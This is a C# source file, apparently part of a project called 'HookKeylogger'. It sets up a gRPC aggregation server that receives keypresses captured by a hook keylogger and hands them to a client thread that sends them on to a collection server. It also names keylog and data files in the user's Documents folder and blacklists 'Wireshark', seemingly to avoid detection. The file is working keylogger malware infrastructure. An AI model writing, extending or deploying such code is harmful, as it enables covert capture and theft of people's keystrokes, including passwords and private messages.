using HookKeylogger.AggergationServer.Types;
using HookKeylogger.Base;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;

namespace KeypressAggregator
{
    class Program
    {
        ///<summary>
        ///Aggregates key-presses sent from the hook key logger.
        ///</summary>
        static void Main(string[] args)
        {
            // The path of the keylog file
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            // The new file that holds the extracted data
            string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";
            string addr = "localhost";
            int port = 4567;
            string serveraddr = "localhost";
            int serverport = 13000;
            var blacklist = new List<string>();
            blacklist.Add("Wireshark");

            // Setup the shared resources
            ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
            ConcurrentQueue<CI> outbuffer = new ConcurrentQueue<CI>();
            Grpc.Core.Server server = new Grpc.Core.Server
            {
                Services = { HookKeylogger.Base.KerPressAggergator.BindService(new KeyPressAggergatorImpl(inputbuffer)) },
                Ports = { new Grpc.Core.ServerPort(addr, port, Grpc.Core.ServerCredentials.Insecure) }
            };
            ServerClient client = new ServerClient(serveraddr, serverport, blacklist.ToArray());
            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer, client);
            Thread aggergationThread = new Thread(new ThreadStart(ksa.Scan));
            Thread sendThread = new Thread(new ThreadStart(client.Start));

            // Start threads and server
            aggergationThread.Start();
            sendThread.Start();
            server.Start();

            Console.WriteLine("Key-Press Aggergation server listening on " +addr + ":" + port);
            Console.WriteLine("Press any key to stop the aggregation server...");
            Console.ReadKey();

            // Shutdown and wait for all threads to finish before exiting.
            aggergationThread.Abort();
            aggergationThread.Join();
            sendThread.Abort();
            sendThread.Join();
            server.ShutdownAsync();
        }
    }
}
